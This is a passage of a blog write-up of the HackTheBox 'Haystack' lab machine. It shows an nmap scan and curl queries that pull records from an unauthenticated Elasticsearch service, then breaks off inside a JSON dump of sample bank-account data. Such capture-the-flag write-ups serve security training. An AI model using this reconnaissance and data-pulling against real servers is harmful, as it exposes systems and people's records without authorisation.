<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox: Haystack" /><meta property="og:locale" content="en" /><meta name="description" content="Scans" /><meta property="og:description" content="Scans" /><link rel="canonical" href="https://megawattsec.com/posts/hackthebox-haystack/" /><meta property="og:url" content="https://megawattsec.com/posts/hackthebox-haystack/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-10-01T10:21:58-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox: Haystack" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-12T15:06:06-04:00","datePublished":"2019-10-01T10:21:58-04:00","description":"Scans","headline":"HackTheBox: Haystack","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/hackthebox-haystack/"},"url":"https://megawattsec.com/posts/hackthebox-haystack/"}</script><title>HackTheBox: Haystack | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox: Haystack</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox: Haystack</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1569939718" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2019-10-01 </em> </span> <span> Updated <em class="timeago" data-ts="1652382366" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-12 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2314 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h2 id="scans"><span class="mr-2">Scans</span><a href="#scans" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">Starting Nmap 7.80 ( &lt;https://nmap.org&gt; ) at 2019-10-01 09:16 EDT  
Nmap scan report for 10.10.10.115  
Host is up, received user-set (0.24s latency).

PORT STATE SERVICE REASON VERSION  
**22/tcp** open ssh syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)  
| ssh-hostkey:  
| 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)  
| 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)  
|_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)  
**80/tcp** open http syn-ack ttl 63 nginx 1.12.2  
|_http-server-header: nginx/1.12.2  
|_http-title: Site doesn&amp;#8217;t have a title (text/html).  
**9200/tcp** open http syn-ack ttl 63 nginx 1.12.2  
| http-methods:  
|_ Potentially risky methods: **DELETE**  
|_http-server-header: nginx/1.12.2  
|_http-title: Site doesn&amp;#8217;t have a title (application/json; charset=UTF-8).  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Aggressive OS guesses: Linux 3.10 &amp;#8211; 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 &amp;#8211; 4.6  
(91%), Linux 3.2 &amp;#8211; 4.9 (91%), Linux 3.8 &amp;#8211; 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 3.16 (90%)

NMAP shows an SSH server, and two HTTP servers. The interesting thing is the HTTP server on port 9200 has the DELETE method available.</code></pre></figure><p> </p><h2 id="website-investigations"><span class="mr-2">Website Investigations</span><a href="#website-investigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The site on regular HTTP port 80 is very bare, only giving us a picture and nothing else:<br /> <img class="alignnone wp-image-347 size-large" data-src="/assets/img/2019/10/2019-10-01_09h41_20.png" data-proofer-ignore></p><p> </p><p>The site on HTTP 9200 has more going on. It is an elasticsearch service version 6.4.2:<br /> <img class="alignnone size-full wp-image-348" data-src="/assets/img/2019/10/2019-10-01_09h42_54.png" data-proofer-ignore></p><p>So the picture is a clue that we’ll be looking up something in the search database. Hence the picture of a “needle”, which is what a search query is sometimes called.</p><p>It’s possible this version of elasticsearch has an exploit out there. There is one I found but it is about the “console” plugin and it doesn’t appear to work here… <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/">CVE-2018-17246</a>.</p><p> </p><h2 id="rest-api"><span class="mr-2">REST API</span><a href="#rest-api" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I didn’t know anything about elasticsearch before this box, so I’ll write out things as I learn them and hope it all goes well. The port 9200 is used for elasticsearch’s REST API, so we’ll need to learn how to use it from elasticsearch’s documentation.</p><p>When trying to use a typical query POST request, I get an error stating that the server doesn’t support POST.</p><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="err">root@kali</span><span class="w"> </span><span class="err">/root</span><span class="w">                                                       
</span><span class="err">⚡</span><span class="w"> </span><span class="err">curl</span><span class="w"> </span><span class="err">-XPOST</span><span class="w"> </span><span class="s2">"http://10.10.10.115:9200"</span><span class="w"> </span><span class="err">-d'</span><span class="w">
</span><span class="p">{</span><span class="w">               
  </span><span class="nl">"query"</span><span class="p">:{</span><span class="w">
    </span><span class="nl">"match_all"</span><span class="p">:{}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="err">'</span><span class="w">
</span><span class="p">{</span><span class="nl">"error"</span><span class="p">:</span><span class="s2">"Incorrect HTTP method for uri [/] and method [POST], allowed: [HEAD, DELETE, GET]"</span><span class="p">,</span><span class="nl">"status"</span><span class="p">:</span><span class="mi">405</span><span class="p">}</span><span class="err">#</span></code></pre></figure><p>And that’s because I wasn’t using it correctly, since I didn’t know what I was doing.</p><p>Here’s a request that returns something.</p><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="err">root@kali</span><span class="w"> </span><span class="err">/root</span><span class="w">                                                                                                            
</span><span class="err">⚡</span><span class="w"> </span><span class="err">curl</span><span class="w"> </span><span class="err">-XPOST</span><span class="w"> </span><span class="s2">"http://10.10.10.115:9200/_search/"</span><span class="w">                                                                         
</span><span class="p">{</span><span class="nl">"took"</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="nl">"timed_out"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"_shards"</span><span class="p">:{</span><span class="nl">"total"</span><span class="p">:</span><span class="mi">11</span><span class="p">,</span><span class="nl">"successful"</span><span class="p">:</span><span class="mi">11</span><span class="p">,</span><span class="nl">"skipped"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"failed"</span><span class="p">:</span><span class="mi">0</span><span class="p">},</span><span class="nl">"hits"</span><span class="p">:{</span><span class="nl">"total"</span><span class="p">:</span><span class="mi">1254</span><span class="p">,</span><span class="nl">"max_score"</span><span class="p">:</span><span class="w">
</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"hits"</span><span class="p">:[{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">".kibana"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"doc"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"config:6.4.2"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"config"</span><span class="p">,</span><span class="nl">"updated_at"</span><span class="p">:</span><span class="s2">"20
19-01-23T18:15:53.396Z"</span><span class="p">,</span><span class="nl">"config"</span><span class="p">:{</span><span class="nl">"buildNum"</span><span class="p">:</span><span class="mi">18010</span><span class="p">,</span><span class="nl">"telemetry:optIn"</span><span class="p">:</span><span class="kc">false</span><span class="p">}}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"25"</span><span class="w">
</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">25</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">40540</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Virginia"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Ayala"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">39</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F
"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"171 Putnam Avenue"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Filodyne"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"virginiaayala@filodyne.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Nicholson"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"PA"</span><span class="p">}</span><span class="w">
</span><span class="p">},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"44"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">44</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">34487</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Au
relia"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Harding"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">37</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"M"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"502 Baycliff Terrace"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Orbalix"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"aureliahar
ding@orbalix.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Yardville"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"DE"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"99"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="s2">"
account_number"</span><span class="err">:</span><span class="mi">99</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">47159</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Ratliff"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Heath"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">39</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"806 Rockwell P
lace"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Zappix"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"ratliffheath@zappix.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Shaft"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"ND"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account
"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"119"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">119</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">49222</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Laverne"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Johnson"</span><span class="p">,</span><span class="nl">"age"</span><span class="w">
</span><span class="p">:</span><span class="mi">28</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"302 Howard Place"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Senmei"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"lavernejohnson@senmei.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Herlong"</span><span class="p">,</span><span class="s2">"sta
te"</span><span class="err">:</span><span class="s2">"DC"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"126"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">126</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">3607</span><span class="p">,</span><span class="s2">"firs
tname"</span><span class="err">:</span><span class="s2">"Effie"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Gates"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">39</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"620 National Drive"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Digitalus"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"effi
egates@digitalus.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Blodgett"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"MD"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"145"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="s2">"_source
"</span><span class="err">:</span><span class="p">{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">145</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">47406</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Rowena"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Wilkinson"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">32</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"M"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"891 El
ton Street"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Asimiline"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"rowenawilkinson@asimiline.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Ripley"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"NH"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"183"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">183</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">14223</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Hudson"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="w">
</span><span class="s2">"English"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"823 Herkimer Place"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Xinware"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"hudsonenglish@xinware.com"</span><span class="p">,</span><span class="s2">"ci
ty"</span><span class="err">:</span><span class="s2">"Robbins"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"ND"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"190"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">190</span><span class="p">,</span><span class="s2">"b
alance"</span><span class="err">:</span><span class="mi">3150</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Blake"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Davidson"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">30</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"636 Diamond Street"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Qua
ntasis"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"blakedavidson@quantasis.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Crumpler"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"KY"</span><span class="p">}},{</span><span class="nl">"_index"</span><span class="p">:</span><span class="s2">"bank"</span><span class="p">,</span><span class="nl">"_type"</span><span class="p">:</span><span class="s2">"account"</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"20
8"</span><span class="p">,</span><span class="nl">"_score"</span><span class="p">:</span><span class="mf">1.0</span><span class="p">,</span><span class="nl">"_source"</span><span class="p">:{</span><span class="nl">"account_number"</span><span class="p">:</span><span class="mi">208</span><span class="p">,</span><span class="nl">"balance"</span><span class="p">:</span><span class="mi">40760</span><span class="p">,</span><span class="nl">"firstname"</span><span class="p">:</span><span class="s2">"Garcia"</span><span class="p">,</span><span class="nl">"lastname"</span><span class="p">:</span><span class="s2">"Hess"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span><span class="nl">"gender"</span><span class="p">:</span><span class="s2">"F
"</span><span class="p">,</span><span class="nl">"address"</span><span class="p">:</span><span class="s2">"810 Nostrand Avenue"</span><span class="p">,</span><span class="nl">"employer"</span><span class="p">:</span><span class="s2">"Quiltigen"</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"garciahess@quiltigen.com"</span><span class="p">,</span><span class="nl">"city"</span><span class="p">:</span><span class="s2">"Brooktrails"</span><span class="p">,</span><span class="nl">"state"</span><span class="p">:</span><span class="s2">"G
A"</span><span class="p">}}]}}</span></code></pre></figure><p>And here is the formatted JSON:</p><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">{</span><span class="w">
  </span><span class="nl">"took"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
  </span><span class="nl">"timed_out"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
  </span><span class="nl">"_shards"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"total"</span><span class="p">:</span><span class="w"> </span><span class="mi">11</span><span class="p">,</span><span class="w">
    </span><span class="nl">"successful"</span><span class="p">:</span><span class="w"> </span><span class="mi">11</span><span class="p">,</span><span class="w">
    </span><span class="nl">"skipped"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
    </span><span class="nl">"failed"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"hits"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"total"</span><span class="p">:</span><span class="w"> </span><span class="mi">1254</span><span class="p">,</span><span class="w">
    </span><span class="nl">"max_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
    </span><span class="nl">"hits"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">".kibana"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"doc"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"config:6.4.2"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"config"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"updated_at"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2019-01-23T18:15:53.396Z"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"config"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"buildNum"</span><span class="p">:</span><span class="w"> </span><span class="mi">18010</span><span class="p">,</span><span class="w">
            </span><span class="nl">"telemetry:optIn"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"_index"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bank"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"account"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"25"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_score"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"_source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"account_number"</span><span class="p">:</span><span class="w"> </span><span class="mi">25</span><span class="p">,</span><span class="w">
          </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="mi">40540</span><span class="p">,</span><span class="w">
          </span><span class="nl">"firstname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Virginia"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"lastname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ayala"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">39</span><span class="p">,</span><span class="w">
          </span><span class="nl">"gender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"F"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"171 Putnam Avenue"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"employer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Filodyne"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"virginiaayala@filodyne.com"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"city"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Nicholson"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PA"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">},</span><span class="w">
